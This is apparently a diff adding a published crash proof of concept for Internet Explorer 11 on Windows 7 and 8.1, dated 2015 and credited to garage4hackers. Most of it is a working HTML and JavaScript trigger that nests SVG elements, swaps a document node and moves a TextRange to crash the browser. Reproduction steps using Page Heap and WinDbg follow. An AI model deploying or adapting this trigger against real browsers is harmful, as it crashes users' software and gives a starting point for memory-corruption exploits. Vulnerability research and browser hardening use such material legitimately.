@@ -1,0 +1,55 @@
+# Exploit Title: Internet Explorer 11 - Crash PoC
+# Google Dork: N/A
+# Date: 19th May, 2015
+# Exploit Author:  garage4hackers
+# Vendor Homepage:  http://garage4hackers.com/showthread.php?t=6246
+# Software Link: N/A
+# Version: Tested on IE 11
+# Tested on: Windows 7
+# CVE : N/A
+
+<!doctype html>
+<html>
+<HEAD><title>case522207.html</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+<style>
+*:nth-child(5)::before {
+	content: 'moof';
+}
+*:nth-child(5)::after {
+    content:'>>';
+}
+</style>
+</HEAD><body>
+<script>
+elem0 = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
+elem1 = document.createElementNS('http://www.w3.org/2000/svg', 'feGaussianBlur')
+elem2 = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
+elem3 = document.createElement('dd')
+elem4 = document.createElement('map')
+elem5 = document.createElement('i')
+elem6 = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
+
+document.body.appendChild(elem0)
+elem0.appendChild(elem1)
+elem1.appendChild(elem2)
+elem1.appendChild(elem3)
+elem1.appendChild(elem4)
+elem1.appendChild(elem5)
+elem1.appendChild(elem6)
+
+rangeTxt = document.body.createTextRange()		
+randOldNode = document.documentElement.firstChild
+randOldNode.parentNode.replaceChild(elem2, randOldNode)
+rangeTxt.moveEnd('sentence', '-20')
+
+</script>
+</body></html>
+
+How do I reproduce it?
+
+- It has been discovered, tested & reduced on Win7 32-bit Ultimate and runs successfully anytime.
+
+a) Enable Page Heap # gflags.exe /p /enable iexplore.exe /full
+b) Execute runMe.html in WinDbg
+c) Tested on Win7 32-bit, Win8.1 32-bit, Win8.1 64-bit (not working on Win8, IE 10)
